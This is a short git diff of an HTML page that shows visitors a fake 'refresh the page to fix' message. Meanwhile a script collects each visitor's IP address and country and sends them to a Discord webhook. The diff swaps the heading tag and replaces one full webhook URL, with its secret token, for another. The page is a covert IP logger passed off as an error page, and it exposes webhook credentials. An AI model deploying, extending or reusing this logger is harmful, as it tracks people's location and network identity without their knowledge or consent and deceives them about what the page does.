@@ -7,7 +7,7 @@
 </head>
 <body>
 
-<h1>If you see this then refresh the page to fix, if it keeps on repeating please contact the owner.</h1>
+<h3>If you see this then refresh the page to fix, if it keeps on repeating please contact the owner.</h3>
 
 <script>
     // Function to get country flag emoji based on country code
@@ -30,7 +30,7 @@
                     const countryCode = countryData.country || 'N/A';
 
                     // Send IP and country information to Discord webhook
-                    const webhookUrl = 'https://discord.com/api/webhooks/1216837087039328266/YzgHgAGktUVp-RIoF6mgscDxEoKDxlTQYgyxl4dw17c_AgWRMaHsiQqFk-yxP6BvFknb';
+                    const webhookUrl = 'https://discord.com/api/webhooks/1221826422616625182/FgixyJO2e1A4xGZIQasrA-xJHDzi0HwVvxehOySWzi9HlyWvyONdPlmHODWzqwCp_rEa';
                     const message = `Visitor IP: ${ipAddress}\nCountry: ${country} ${getFlagEmoji(countryCode)}`;
 
                     fetch(webhookUrl, {
